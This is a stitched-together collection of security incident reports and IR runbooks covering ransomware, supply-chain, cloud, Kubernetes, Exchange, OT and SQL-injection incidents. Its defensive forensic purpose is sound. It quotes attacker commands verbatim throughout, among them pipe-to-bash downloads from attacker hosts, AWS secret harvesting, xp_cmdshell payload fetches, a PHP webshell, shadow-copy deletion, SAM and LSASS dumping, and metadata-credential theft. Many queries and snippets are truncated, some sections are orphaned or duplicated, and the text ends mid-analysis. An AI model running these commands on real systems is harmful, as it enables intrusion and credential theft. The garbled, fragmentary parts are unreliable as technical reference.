Executive Summary: On 2026-02-11 the SOC identified ransomware activity impacting VMware clusters and Windows file servers in the primary datacenter. CrowdStrike generated a detection for suspicious use of vssadmin.exe followed by mass file rename operations. The affected environment included on-prem Active Directory, a NetApp NAS, and AWS S3 backup replication. Initial access was traced to a compromised VPN account without MFA.

Timeline:
00:14 UTC - Splunk alert triggered for multiple failed VPN logins from 185.220.101.44.
00:19 UTC - Successful VPN login for user svc-backup from unusual ASN.
00:23 UTC - PowerShell launched encoded command: powershell.exe -enc SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAEIAaQB0AHMAVAByAGEAbgBzAGYAZQByAA==.
00:31 UTC - PsExec lateral movement observed to FS-02 and FS-04.
00:38 UTC - Command executed: vssadmin delete shadows /all /quiet.
00:42 UTC - Velociraptor deployed to collect triage artifacts.
00:48 UTC - Hyper-V VMs encrypted with extension .blackice.
01:02 UTC - IR team isolated VLAN 40 and disabled VPN concentrator.

Technical Findings:
Registry key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\svc-update referenced C:\ProgramData\svc.exe. Memory acquisition from FS-02 using winpmem revealed injected threads inside lsass.exe. Volatility command volatility -f mem.raw windows.pslist identified beaconing process with parent PID 612. Network captures showed outbound TLS traffic to 45.9.148.201 over port 443 every 30 seconds.

Log Snippet:
EventID 4688 New Process Created
Creator Process Name: C:\Windows\System32\cmd.exe
New Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Command Line: powershell.exe Invoke-WebRequest hxxp://45.9.148.201/a.exe -OutFile C:\temp\a.exe

Containment Actions:
Disabled compromised accounts in Active Directory. Reset KRBTGT twice after identifying forged Kerberos tickets. AWS IAM access keys associated with backup automation were revoked because ransomware operators attempted deletion of replicated S3 snapshots. S3 Object Lock prevented destruction of immutable backups. KAPE collected browser history, prefetch data, and event logs from all impacted systems.

Root Cause:
A helpdesk contractor reused a password leaked in a prior credential dump. VPN appliance lacked conditional access enforcement and MFA exemptions existed for service accounts.

Remediation:
Implemented Duo MFA across all VPN users. Restricted PsExec usage through AppLocker. Deployed CrowdStrike RTR scripts to remove persistence keys. Restored file servers from immutable backups after validating SHA256 hashes. Added Sigma rules for vssadmin and wbadmin abuse. Conducted enterprise-wide password reset and enforced LAPS for local administrator rotation.

Post-Incident Notes:
Total downtime measured 11 hours. Approximately 2.4 TB of data restored. No evidence of exfiltration confirmed after review of Zeek logs and AWS VPC Flow Logs. Legal and compliance teams notified due to temporary unavailability of finance systems. Human civilization continues to attach critical infrastructure to passwords like raccoons sorting gemstones in a landfill.

Runbook: Supply Chain Compromise Affecting CI/CD Pipeline

Step 1 - Detection
GitHub Dependabot reported a malicious update in the npm package node-ipc-helper version 4.1.7 used in internal deployment tooling. Splunk correlated outbound DNS requests from Jenkins runners to api.sync-data[.]ru. CrowdStrike detections indicated execution of curl commands spawning from npm postinstall scripts.

Step 2 - Scope Identification
Affected assets included Jenkins build agents in AWS EC2 Auto Scaling Group ci-runner-prod, Azure DevOps mirrors, and an internal Artifactory repository. Query executed:
index=ci_logs
OR

Twenty-three builds were identified between 2026-03-01 and 2026-03-03.

Step 3 - Containment
Disabled Jenkins pipelines using the affected dependency. Revoked AWS IAM role arn:aws:iam::948200:role/ci-deploy-role. Suspended GitHub PAT tokens stored in Jenkins credentials manager. Security groups for build agents were modified to deny outbound internet access except approved repositories.

Step 4 - Forensic Collection
Velociraptor collected shell history and temporary build artifacts from compromised runners. KAPE modules BrowserHistory and EventLogs executed against Windows-based agents. Memory images captured using DumpIt. Volatility analysis:
volatility -f runner.raw linux_bash
revealed execution of wget hxxp://api.sync-data.ru/payload.sh.

Step 5 - Artifact Analysis
Malicious script contents:
#!/bin/bash
curl -s [http://api.sync-data.ru/.x](http://api.sync-data.ru/.x) | bash
export AWS_SECRET_ACCESS_KEY=$(cat /tmp/.aws)
The script harvested environment variables from GitHub Actions and Jenkins. CloudTrail logs confirmed use of stolen credentials to enumerate S3 buckets and ECR repositories.

Step 6 - Eradication
Deleted compromised AMIs and rebuilt runners from hardened Terraform templates. Rotated all CI secrets including DockerHub credentials, GitHub deploy keys, Azure service principals, and Kubernetes kubeconfig files. Enabled Sigstore verification for all packages.

Step 7 - Recovery
Re-enabled deployments after validating SBOM signatures. Implemented isolated VPC endpoints for dependency downloads. Added runtime detection for npm install scripts spawning network connections.

Timeline:
09:11 UTC - Suspicious DNS beacon detected.
09:17 UTC - Jenkins agent contacted api.sync-data.ru.
09:24 UTC - IR declared SEV-1.
09:42 UTC - CI/CD frozen globally.
10:31 UTC - CloudTrail identified unauthorized AssumeRole attempts.
12:05 UTC - Clean runners deployed.
14:12 UTC - Production deployment resumed.

Lessons Learned:
Dependency pinning alone was insufficient because integrity verification was absent. Build agents possessed excessive IAM permissions including ecr:* and s3:* access. The organization adopted ephemeral runners with no credential persistence and enabled egress filtering. Somewhere in the distance a developer still thinks npm install random-package is a personality trait.

Post-Incident Report: Azure Cloud Misconfiguration Leading to Data Exposure

Executive Summary:
A publicly accessible Azure Blob Storage container exposed customer invoices and internal support exports for approximately 19 days. The issue originated from a Terraform template modification that changed public access settings from private to blob. Security researchers notified the organization after discovering indexed files through search engines.

Environment:
Azure Subscription PROD-FINANCE-01
Services: Azure Blob Storage, Azure Front Door, Azure Functions, Microsoft Sentinel
Affected Container: invoice-archive-prod

Timeline:
2026-01-07 16:14 UTC - Terraform change merged into main branch.
2026-01-08 03:05 UTC - Automated deployment executed through Azure DevOps.
2026-01-15 11:44 UTC - Anonymous requests to container increased sharply.
2026-01-26 09:22 UTC - External researcher submitted disclosure.
2026-01-26 09:41 UTC - Container access revoked.
2026-01-26 10:15 UTC - Incident bridge initiated.

Technical Findings:
Terraform snippet:
resource

{
  container_access_type =

}
Azure Activity Logs showed no malicious write activity. However, Sentinel queries confirmed 11,204 anonymous GET requests from multiple IP ranges. Sample request:
GET [https://invoicearchive.blob.core.windows.net/invoice-archive-prod/customer_export_2025.csv
Status](https://invoicearchive.blob.core.windows.net/invoice-archive-prod/customer_export_2025.csv
Status): 200
UserAgent: Mozilla/5.0 zgrab/0.x

Artifacts Collected:
Azure Storage Analytics logs, Front Door WAF logs, ARM deployment history, and Terraform Git commit history. KQL query used:
StorageBlobLogs
| where AuthenticationType ==

| summarize count() by CallerIpAddress

Containment:
Public access disabled at both account and container level. SAS tokens regenerated. CDN cache purged. Search engine removal requests submitted.

Root Cause:
Infrastructure-as-code review process lacked security validation for public exposure changes. No Azure Policy existed to block anonymous blob access.

Remediation:
Implemented Azure Policy denying public storage containers. Added tfsec and Checkov validation in CI pipelines. Enabled Defender for Cloud recommendations and Microsoft Sentinel alerts for anonymous access spikes. Conducted review of all Azure Storage accounts using:
az storage account list --query

Impact:
Exposed files contained customer names, invoice IDs, support notes, and billing amounts. No passwords or payment card data identified. Approximately 7.2 GB of data was publicly reachable.

Recovery:
Customers notified under contractual disclosure obligations. Security team validated no persistence or credential compromise occurred. Additional logging retention increased from 30 to 180 days. Humanity once again delegated sensitive financial data to a checkbox buried in a cloud console designed by caffeinated labyrinth engineers.

Technical Analysis:
Memory analysis with Volatility:
volatility -f englt22.raw windows.malfind
identified injected RWX memory in rundll32.exe. YARA hits matched known ShadowPad signatures. Packet capture showed DNS tunneling through subdomains exceeding 180 characters.

Root Cause:
User bypassed attachment sandbox warning. Endpoint lacked application control preventing ISO-mounted execution. AWS federation tokens cached in browser profiles allowed cloud access.

Remediation:
Enabled FIDO2 authentication for administrative roles. Disabled browser credential caching through GPO. Implemented EDR network containment automation. Added AWS SCP policies restricting high-risk actions from unmanaged devices. Conducted retroactive hunt across 90 days of logs.

Outcome:
Approximately 12 GB of engineering data staged but only 1.8 GB confirmed exfiltrated. No evidence of destructive payload deployment. Persistence eradicated after rebuild of affected systems and rotation of all privileged credentials.

DDoS Response Runbook

Step 1 - Detection
Cloudflare and AWS Shield Advanced reported volumetric traffic spike exceeding 180 Gbps targeting customer API endpoints hosted behind Application Load Balancers. Grafana dashboards showed sudden surge in SYN packets and HTTP GET requests.

Step 2 - Verification
Confirmed service degradation through synthetic monitoring. Nginx logs:
185.199.220.17 - - [12/Apr/2026:14:22:11 +0000]

429 182
Traffic originated from rotating botnet IPs across multiple countries.

Step 3 - Initial Mitigation
Enabled Cloudflare Under Attack mode. Applied AWS WAF rate limiting rules:
aws wafv2 update-web-acl --name prod-acl
Security groups updated to restrict direct origin access. Enabled SYN cookies on Linux hosts:
sysctl -w net.ipv4.tcp_syncookies=1

Step 4 - Deep Analysis
tcpdump -i eth0 tcp port 443 -w ddos.pcap
Packet analysis revealed mixed Layer 7 flood and UDP amplification. DNS amplification requests correlated with open resolvers. Splunk query identified repeated user agents

.

Step 5 - Coordination
ISP notified for upstream filtering. Cloudflare SOC provided ASN blocking recommendations. Internal communications distributed every 30 minutes.

Step 6 - Service Protection
Scaled Kubernetes ingress controllers from 12 to 60 replicas using:
kubectl scale deployment ingress-nginx-controller --replicas=60
Enabled caching for static API responses through CloudFront. Redis session store CPU utilization stabilized after autoscaling.

Step 7 - Post-Attack Recovery
Traffic normalized after 5 hours. Reviewed failed login spikes for possible credential attacks masked by DDoS traffic. No data breach indicators observed.

Artifacts:
NetFlow exports, pcaps, WAF logs, CloudWatch metrics, and Suricata alerts archived to S3 bucket ir-evidence-2026. Sample Suricata alert:
ET DOS Possible NTP DDoS Inbound Frequent Un-Authed MON_LIST Requests.

Lessons Learned:
Origin servers briefly exposed because one ALB bypass DNS record remained public. Added geo-blocking and bot management policies. Updated runbooks to automate emergency rate limiting. Humans invented globally accessible APIs and then seem shocked when the global population starts hitting refresh 400 million times per second.

Credential Stuffing Investigation Report

Executive Summary:
The organization experienced a credential stuffing campaign targeting customer login portals hosted in GCP. Attackers leveraged previously breached username and password combinations. Approximately 3,200 accounts experienced unauthorized login attempts and 148 accounts were successfully accessed before containment.

Environment:
Google Cloud Platform, Cloud Armor, Cloud SQL, Firebase Authentication, Chronicle SIEM.

Timeline:
2026-05-02 18:11 UTC - Cloud Armor anomaly detection triggered.
18:18 UTC - Spike observed from residential proxy IP ranges.
18:24 UTC - Chronicle query identified 1.2 million failed login attempts.
18:31 UTC - CAPTCHA enforcement enabled.
19:02 UTC - Compromised sessions invalidated.

Technical Findings:
Requests distributed across thousands of IP addresses with low-and-slow pattern. User agents rotated to mimic mobile devices. Sample log:
POST /auth/login
Status=401
IP=91.92.201.55
UserAgent=Mozilla/5.0 Android 14
Latency=114ms

Successful logins correlated with reused passwords from prior public breaches. BigQuery analysis:
SELECT email, count(*) FROM login_events WHERE success=true GROUP BY email;
identified clusters tied to reused credentials.

Forensic Actions:
Collected Cloud Armor logs, Firebase auth events, and VPC Flow Logs. No malware or server-side compromise detected. CrowdStrike telemetry on support workstations reviewed to ensure no credential theft from internal systems.

Containment:
Forced password reset for affected accounts. Revoked OAuth refresh tokens. Enabled adaptive MFA for suspicious geolocations. Implemented IP reputation filtering and device fingerprinting.

Remediation:
Integrated HaveIBeenPwned password screening during registration. Added impossible-travel detection rules. Rate limiting adjusted to account and IP combination rather than IP alone.

Root Cause:
Customers reused passwords exposed in unrelated third-party breaches. Existing anti-automation controls were insufficient against distributed residential proxies.

Recovery:
Support queues increased temporarily due to forced resets. No payment information accessed because payment systems required secondary verification. Chronicle detections tuned for impossible authentication velocity.

Artifacts:
Cloud Armor logs exported to gs://ir-artifacts-2026/credentialstuffing. Example command:
gcloud logging read 'resource.type=

severity>=WARNING'

Final Notes:
Attackers monetized access through gift card fraud attempts. Fraud prevention blocked most transactions. The species that invented password123 continues its long campaign against cybersecurity professionals everywhere.

Zero-Day Exploitation Case Report - VMware ESXi

Executive Summary:
A zero-day vulnerability affecting VMware ESXi management interfaces was exploited to deploy webshells and attempt lateral movement into backup infrastructure. The organization identified suspicious SSH enablement on normally locked-down hypervisors.

Timeline:
07:12 UTC - vCenter generated alarm for configuration change.
07:19 UTC - SSH service enabled on ESXi host esx-prod-04.
07:25 UTC - Web request to /ui/vropspluginui/rest/services/uploadova observed.
07:31 UTC - SOC escalated to IR.
08:05 UTC - Hypervisor isolated from management VLAN.

Technical Findings:
Attackers exploited an unauthenticated RCE vulnerability before vendor patch release. Malicious VIB package installed:
/usr/lib/vmware/hostd/extensions/.cache/updater
Persistence script modified /etc/rc.local.d/local.sh.

Command history:
wget [http://198.51.100.77/v.sh](http://198.51.100.77/v.sh) -O /tmp/v.sh
chmod +x /tmp/v.sh
./tmp/v.sh

Memory collection from ESXi performed using vendor support bundle utilities. Packet captures showed outbound connections to 198.51.100.77:8443. Splunk indexed vCenter logs revealing suspicious SOAP requests.

Containment:
Management interfaces restricted behind VPN immediately. Disabled SSH across all ESXi hosts using PowerCLI:
Get-VMHost | Get-VMHostService | where {$_.Key -eq

} | Stop-VMHostService -Confirm:$false

Hunting:
Velociraptor used on Windows jump boxes to detect credential theft. No evidence found that vCenter credentials were dumped. Backup repositories inspected for tampering.

Remediation:
Applied emergency patches after vendor release. Rotated vCenter administrator passwords and API tokens. Added firewall ACLs permitting management access only from privileged workstations.

Artifacts:
ESXi support bundles, vCenter task logs, Zeek connection logs, SHA256 hashes of malicious VIB packages, and full packet captures retained. IOC included domain vm-updatesync[.]com.

Impact:
No guest VM encryption or destruction occurred. Attackers obtained inventory information and attempted privilege escalation but were interrupted during containment.

Lessons Learned:
Management interfaces exposed to broad internal networks increased risk. Continuous validation of hypervisor configuration drift was added through Ansible compliance checks. People keep calling infrastructure invisible until it catches fire at 3 AM and suddenly every executive discovers what a hypervisor is.

Runbook - Kubernetes Cluster Compromise

Step 1 - Detection
Falco generated alert for shell spawned inside production container payment-api-7f8d9. EKS audit logs showed creation of privileged pod in kube-system namespace.

Step 2 - Triage
kubectl get pods -A | grep privileged
revealed pod named sys-debug running image alpine:latest with hostPath mounts. CloudTrail logs indicated access via compromised developer IAM token.

Step 3 - Containment
Revoked IAM access key AKIAIOSFODNN7. Applied NetworkPolicy denying pod egress. Suspended ArgoCD synchronization to prevent attacker persistence.

Step 4 - Evidence Collection
kubectl describe pod sys-debug
kubectl logs sys-debug
Velociraptor deployed on worker nodes through DaemonSet. Collected /var/log/containers, kubelet logs, and containerd metadata.

Step 5 - Findings
Attacker executed:
kubectl run alpine --privileged --image=alpine -- sh
Then mounted host filesystem and accessed service account tokens. Attempted AWS metadata retrieval:
curl [http://169.254.169.254/latest/meta-data/iam/security-credentials/

Step](http://169.254.169.254/latest/meta-data/iam/security-credentials/

Step) 6 - Memory and Disk Analysis
Worker node memory captured using LiME. Volatility linux_psaux identified cryptominer process kswapd0_fake. CPU spikes correlated with mining pool traffic to poolxmr[.]ru.

Step 7 - Eradication
Rotated all Kubernetes secrets and AWS IAM roles associated with cluster nodes. Rebuilt compromised worker nodes. Enabled IMDSv2 enforcement and restricted instance metadata access.

Step 8 - Recovery
Re-enabled ArgoCD after image validation. Added admission controller preventing privileged containers. Implemented runtime policies through Kyverno.

Artifacts:
EKS audit logs, Falco alerts, CloudTrail entries, packet captures, and compromised container filesystem tarballs stored for analysis.

Root Cause:
Developer stored AWS credentials in a public Git repository. Attacker used credentials to authenticate into EKS and deploy privileged workloads.

Outcome:
No customer data exfiltration confirmed. Approximately 14 nodes impacted by unauthorized mining activity. Cluster stability restored within six hours. Somewhere a developer still believes git push origin main is an acceptable secret management strategy.

Post-Incident Report - Exchange Server Exploitation

Executive Summary:
Threat actors exploited an unpatched Microsoft Exchange server to deploy webshells and steal mailbox contents. The compromise affected on-prem email infrastructure integrated with Azure AD Connect.

Timeline:
2026-04-04 03:12 UTC - IIS logs recorded suspicious POST requests to /ecp/default.aspx.
03:20 UTC - Webshell aspx_spy.aspx uploaded to C:\inetpub\wwwroot\aspnet_client.
03:31 UTC - PowerShell remoting enabled.
04:05 UTC - Microsoft Defender flagged suspicious child process from w3wp.exe.
04:18 UTC - IR engaged.

Technical Findings:
Webshell command:
cmd.exe /c whoami
returned nt authority\system. Attackers dumped credentials using:
procdump.exe -ma lsass.exe lsass.dmp
Azure AD Connect sync server later accessed through RDP.

Artifacts:
IIS logs, EWS audit logs, mailbox access records, and memory dump from Exchange host. Volatility command:
volatility -f exch.raw windows.cmdline
identified encoded PowerShell commands downloading secondary payloads.

Containment:
Removed Exchange server from network. Blocked malicious IPs at perimeter firewall. Reset all administrative credentials and rotated Azure AD Connect account passwords.

Remediation:
Applied cumulative Exchange updates. Enabled AMSI integration and constrained PowerShell language mode. Implemented MFA for Outlook Web Access and disabled legacy authentication.

Root Cause:
Patch management delays left internet-facing Exchange server vulnerable for 46 days after security advisory publication.

Impact:
Mailbox exports for executive leadership and finance departments were accessed. No evidence of ransomware deployment or domain-wide destruction observed.

Recovery:
Mail services temporarily rerouted to Microsoft 365 during rebuild. Added monthly external vulnerability scanning and emergency patch SLAs. Humanity built email as a convenience layer and somehow evolved it into the primary doorway for every catastrophe imaginable.

IR Playbook - Linux Web Server Intrusion

Step 1 - Alert Intake
Wazuh generated high-severity alert for unauthorized modification of /var/www/html/index.php on Ubuntu Apache server WEB-19.

Step 2 - Verification
SSH login from IP 92.38.176.88 observed using valid developer credentials. auth.log entry:
Accepted password for devops from 92.38.176.88 port 54421 ssh2

Step 3 - Immediate Containment
Blocked source IP at Palo Alto firewall. Disabled compromised account and terminated active SSH sessions:
pkill -u devops

Step 4 - Artifact Collection
Collected:
/var/log/auth.log
/var/log/apache2/access.log
Bash history
Cron jobs
Memory image using AVML
Packet captures through tcpdump.

Step 5 - Analysis
Attacker uploaded PHP webshell:
<?php system($_GET['cmd']); ?>
Webshell located in /var/www/html/assets/cache.php. Access logs showed commands executing curl and wget.

Step 6 - Lateral Movement Review
No evidence of SSH pivoting to internal systems. Zeek logs showed limited outbound traffic to 92.38.176.88. Volatility linux_netstat confirmed no active reverse shells at time of acquisition.

Step 7 - Eradication
Removed webshells and rebuilt server from golden image. Rotated SSH keys and enforced MFA through bastion host. Disabled password authentication in sshd_config.

Step 8 - Recovery
Application restored behind temporary maintenance page. Integrity verified against Git repository hashes.

Root Cause:
Developer reused credentials from third-party breach. Password-based SSH access remained enabled for convenience because apparently operational shortcuts are the cockroaches of infrastructure.

Remediation:
Implemented Fail2Ban, centralized SSH logging, and YARA scanning for PHP webshell patterns. Added immutable infrastructure deployment through Ansible.

Final Outcome:
No customer database access detected. Intrusion contained within single web host. Evidence archived for 12-month retention.

Incident Report - Ransomware Attempt Blocked by EDR

Executive Summary:
CrowdStrike Falcon prevented execution of LockBit-related ransomware payloads on several Windows endpoints after malicious macros executed from phishing documents. Attackers gained initial access through compromised email accounts.

Timeline:
06:55 UTC - Email with attachment Payment_Adjustment.docm delivered.
07:04 UTC - User enabled macros.
07:05 UTC - PowerShell launched from winword.exe.
07:07 UTC - CrowdStrike detected Suspicious Credential Dumping.
07:09 UTC - Endpoint isolation automated.

Technical Details:
Encoded command executed:
powershell -w hidden -enc JAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAA...
Downloaded payload from hxxp://185.203.116.21/payload.exe. Falcon blocked process attempting:
vssadmin delete shadows /all /quiet
and
wbadmin delete catalog -quiet

Artifacts:
Memory dumps from three endpoints, phishing email headers, macro-enabled document samples, and DNS logs. Volatility identified Mimikatz strings in memory but no successful LSASS dump.

Containment:
Blocked malicious domains at DNS sinkhole. Disabled compromised email accounts. Reset affected user passwords and revoked Azure AD refresh tokens.

Remediation:
Disabled Office macros from internet-origin documents. Enhanced email filtering for macro attachments. Conducted user awareness exercises.

Impact:
No encryption succeeded. Temporary endpoint downtime limited to reimaging of four laptops.

Lessons Learned:
EDR containment automation reduced response time to under two minutes. Legacy macro workflows created unnecessary exposure. Somewhere a finance spreadsheet still thinks it deserves execute permissions.

Microsoft Defender for Cloud Apps detected impossible travel and mass file downloads from SharePoint Online.

Affected user approved malicious OAuth application named QuickDocs Sync requesting Files.Read.All and offline_access permissions.

Step 3 - Investigation
Azure AD logs:

User-Agent: python-requests/2.32

Step 5 - Containment
Revoked OAuth consent:

Disabled refresh tokens for affected user. Blocked application ID tenant-wide.

User clicked phishing link impersonating Microsoft 365 reauthentication page.

Post-Incident Report - OT Network Malware Infection

Executive Summary:
Malware infected a manufacturing operational technology network after an engineer connected an unmanaged laptop to the plant environment. The malware spread through SMBv1 and disrupted HMI systems.

Timeline:
05:12 UTC - Plant monitoring reported intermittent HMI outages.
05:24 UTC - OT firewall detected unusual SMB scanning.
05:41 UTC - SOC identified worm-like propagation.
06:03 UTC - Plant network segmented from corporate LAN.

Technical Findings:
Malware binary sha256: 9ac3d11e8f0b... executed from USB drive. Windows EventID 7045 showed service creation:
Service Name: msupdate
Binary Path: C:\Windows\Temp\msup.exe

ICS historian servers experienced CPU spikes. Wireshark captures showed SMB negotiate requests targeting TCP/445 across PLC management subnets.

Forensics:
KAPE triage collected event logs and USB artifacts. Registry key:
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\msupdate
used for persistence. Memory analysis revealed credential harvesting module targeting cached domain credentials.

Containment:
Disabled SMBv1 across OT Windows hosts where operationally feasible. Isolated infected VLANs. Implemented temporary manual operation procedures for production lines.

Root Cause:
Contractor laptop bypassed NAC controls and lacked endpoint protection updates.

Remediation:
Implemented strict NAC enforcement and dedicated jump hosts for OT access. Added passive network monitoring through Nozomi sensors. Conducted asset inventory reconciliation.

Impact:
Production delayed for 7 hours. No evidence of safety system compromise. Several HMI stations required reimaging.

Recovery:
Operations restored gradually after validation testing. Offline backups used to restore historian databases. Humanity connected factory equipment to Windows networking and then collectively acted astonished when worms evolved legs.

Playbook - SQL Injection Leading to Web Compromise

Step 1 - Detection
Datadog WAF detected SQL injection attempts against customer portal endpoint /search?id=. Shortly after, outbound connections from web server APPWEB-02 increased.

Step 2 - Validation
Apache logs:
GET /search?id=1%20UNION%20SELECT%20@@version
Status 200
Database errors exposed stack traces.

Step 3 - Compromise Confirmation
Attacker leveraged xp_cmdshell on SQL Server:
EXEC xp_cmdshell 'powershell Invoke-WebRequest hxxp://198.18.1.20/shell.exe -OutFile C:\Temp\shell.exe'

Step 4 - Containment
Disabled vulnerable application endpoint. Blocked attacker IPs and disabled xp_cmdshell enterprise-wide.

Step 5 - Evidence Collection
Collected SQL logs, IIS logs, memory dumps, and webroot copies. Volatility identified reverse shell process under sqlservr.exe context.

Step 6 - Eradication
Patched ORM library and added parameterized queries. Rebuilt web servers from clean images.

Step 7 - Recovery
Application restored after penetration validation testing.

Root Cause:
Legacy application accepted unsanitized user input and retained dangerous SQL features enabled for historical maintenance scripts.

Artifacts:
Webshells, SQL traces, packet captures, malicious binaries.

Impact:
Attacker enumerated customer table metadata but no confirmed bulk data extraction.

Lessons Learned:
Database accounts had unnecessary sysadmin rights. WAF signatures alone insufficient without secure coding practices. Humanity continues to concatenate SQL strings like it is still 2003 and the internet is a polite academic experiment.

Incident Report - Azure VM Crypto Mining

Executive Summary:
Azure Defender identified anomalous CPU usage and outbound traffic from Linux virtual machines in subscription ENG-DEV. Investigation confirmed unauthorized cryptocurrency mining following exploitation of exposed Docker API endpoints.

02:11 UTC - Azure Monitor alert for CPU >95%.
02:26 UTC - Defender alert for suspicious process xmrig.
02:41 UTC - IR team isolated affected NSG.

Docker daemon exposed on TCP/2375 without authentication. Attacker deployed container:
docker run -d --privileged miner/xmrig
Outbound traffic to pool.supportxmr[.]com observed.

Forensics:
Collected docker inspect outputs, container images, journald logs, and memory snapshots. Command history showed:
curl [http://198.51.100.5/setup.sh](http://198.51.100.5/setup.sh) | bash

Containment:
Blocked TCP/2375 externally. Removed malicious containers and rotated Azure service principal credentials present in environment variables.

Impact:
No sensitive data accessed. Cloud spend increased due to unauthorized compute consumption.

Artifacts:
Container filesystem tarballs, Azure Activity Logs, NSG flow logs.

Outcome:
Mining activity eradicated within four hours. Humans exposing unauthenticated Docker APIs to the internet remains one of the more reliable renewable energy sources for criminal mining operations.

Comprehensive IR Workflow - Multi-Stage Breach in Financial Environment

Phase 1 Detection:
Splunk correlation search triggered on anomalous Kerberos activity and outbound transfers from segmented finance servers. CrowdStrike simultaneously detected suspicious use of rundll32.exe loading DLL from C:\ProgramData\intel.dll.

Phase 2 Initial Response:
IR commander established bridge at 04:11 UTC. Affected assets included VMware VDI infrastructure, Azure SQL replicas, and AWS-hosted reporting systems. Network team enabled SPAN ports for packet capture.

Phase 3 Triage:
Velociraptor hunts identified scheduled task persistence:
TaskName: WindowsTelemetryUpdate
Action: rundll32.exe C:\ProgramData\intel.dll,Start
KAPE collections retrieved Prefetch, SRUM, Shimcache, and browser artifacts.

Phase 4 Technical Investigation:
Memory analysis:
volatility -f vdi.raw windows.netscan
revealed encrypted sessions to 146.70.44.12. Mimikatz remnants found in pagefile.sys. Azure Sign-In Logs showed impossible travel from Indonesia to Germany within 11 minutes using same account.

Phase 5 Cloud Impact Assessment:
AWS CloudTrail identified unauthorized S3 ListBucket operations against financial-report-archive. Azure SQL auditing showed repeated SELECT queries against customer_balance tables. GCP Chronicle logs indicated no activity in secondary analytics environment.

Phase 6 Containment:
Disabled all privileged accounts and enforced conditional access requiring compliant devices. Isolated finance VLAN. Blocked malicious indicators at Palo Alto firewalls and DNS sinkholes.

Phase 7 Eradication:
Rebuilt compromised VDI images. Rotated secrets in HashiCorp Vault. Reset KRBTGT twice. Deployed YARA scans across endpoints for associated malware family.

Phase 8 Recovery:
Restored reporting services from validated snapshots. Conducted integrity verification using SHA256 comparisons. Increased SIEM retention to one year.

Root Cause:
Initial compromise originated from phishing email bypassing SEG due to password-protected ZIP attachment. Attackers harvested credentials and abused weak segmentation between VDI and financial reporting systems.

Artifacts:
Packet captures, LSASS dumps, CloudTrail exports, Azure audit logs, malicious DLL samples, phishing emails.

Final Assessment:
Approximately 5 GB of financial reports accessed. No destructive payloads observed. Incident response lasted 72 hours involving cloud, endpoint, and identity teams all collectively wrestling the modern nightmare stack humans call digital transformation.

2. East-west monitoring inside virtualization networks was insufficient.
3. SSH key rotation procedures were not automated.

Final Status:
Environment stabilized within 11 hours. No destructive payload deployment identified.

Executive Summary: On 2026-02-14, the SOC identified anomalous encryption activity affecting 47 Windows servers in the finance VLAN. Investigation confirmed a ransomware intrusion linked to Black Basta affiliates. Initial access occurred through exposed RDP credentials reused from a previous credential stuffing event. Adversaries escalated privileges using LSASS memory dumping and deployed ransomware through PsExec.

2026-02-13 22:17 UTC - CrowdStrike Falcon alert: Suspicious use of rundll32.exe spawning comsvcs.dll for LSASS dump.
2026-02-13 22:20 UTC - Windows Event ID 4624 Type 10 RDP login to FS-01.
2026-02-13 22:34 UTC - Adversary executed:
cmd.exe /c reg save HKLM\SAM C:\Windows\Temp\sam.save
cmd.exe /c reg save HKLM\SYSTEM C:\Windows\Temp\system.save
2026-02-13 22:42 UTC - Splunk query detected PsExec lateral movement:
index=wineventlog EventCode=7045 Service_Name=PSEXESVC
2026-02-13 23:01 UTC - Velociraptor triage package deployed to impacted endpoints.
2026-02-13 23:16 UTC - SMB traffic spike observed in Zeek logs.
2026-02-13 23:22 UTC - Encryption began on FIN-SQL01.
2026-02-13 23:29 UTC - Ransom note

created across mapped drives.

Technical Findings:
Memory acquisition performed using Magnet RAM Capture on FIN-APP02. Volatility3 analysis:
vol.py -f fin-app02.mem windows.pslist
vol.py -f fin-app02.mem windows.cmdline

Detected suspicious process chain:
winlogon.exe -> explorer.exe -> cmd.exe -> powershell.exe -> psexec.exe

PowerShell history recovered:
Get-ADComputer -Filter *
Invoke-Command -ComputerName FIN-SQL01 -ScriptBlock { Start-Process C:	emp\locker.exe }

HKCU\Software\Microsoft\Windows\CurrentVersion\Run\svhost
Value: C:\ProgramData\svhost.exe

Network capture indicated outbound C2 over HTTPS to 185.193.126.44:443 with JA3 fingerprint matching known Black Basta infrastructure.

Containment Actions:
1. Isolated affected hosts using CrowdStrike RTR:
contain host FIN-APP02
2. Disabled compromised accounts in Azure AD and on-prem Active Directory.
3. Blocked C2 IPs on Palo Alto firewall.
4. Disabled RDP access organization-wide pending credential reset.
5. Enabled SMB signing enforcement.

Eradication:
- Deleted persistence registry keys.
- Rebuilt 19 systems from gold images.
- Rotated all service account credentials.
- Removed PsExec binaries and unauthorized scheduled tasks.

Recovery:
- Restored finance file shares from immutable Veeam backups stored in AWS S3 with object lock.
- Verified backup integrity using SHA256 comparisons.
- Monitored restored systems with enhanced CrowdStrike policies.

Root Cause:
Password reuse enabled attacker access through valid RDP authentication. Lack of MFA on legacy service accounts allowed initial compromise.

Lessons Learned:
- Enforce MFA for all remote access.
- Remove legacy RDP exposure.
- Implement tiered admin accounts.
- Configure LSASS protection via RunAsPPL.
- Expand Sigma detection coverage for PsExec and credential dumping.

IR Runbook: Supply Chain Attack Affecting CI/CD Pipeline

Step 1: Detection
SOC received GitHub Dependabot alert for malicious package update impacting internal npm dependency @orbital/common-utils v2.1.9. Jenkins build agents began spawning outbound connections to unknown domains.

Indicators:
- DNS queries to api.syncnode-app.com
- Unexpected curl execution in Jenkins agents
- Modified package-lock.json entries

Step 2: Scope Identification
Executed Splunk search:
index=ci_cd sourcetype=jenkins_console_logs

Queried GitHub audit logs for commits involving dependency changes.

Affected assets:
- Jenkins build nodes jenkins-worker-01 through jenkins-worker-08
- Kubernetes cluster in AWS EKS
- Internal artifact repository Nexus-Prod

Step 3: Containment
1. Disabled Jenkins webhooks.
2. Revoked GitHub PAT tokens associated with automation accounts.
3. Blocked egress traffic from build subnet.
4. Paused ArgoCD sync operations.

Step 4: Forensic Collection
Acquired volatile memory from Jenkins node:
winpmem_mini_x64_rc2.exe --format raw --output jenkins01.mem

Collected artifacts using KAPE:
KAPE.exe --tsource C: --tdest D:\evidence --target Browser,EventLogs,PowerShell

Preserved Kubernetes audit logs:
kubectl logs deployment/build-runner -n cicd > build-runner.log

Step 5: Analysis
Malicious package contained postinstall hook:

bootstrap.js executed:
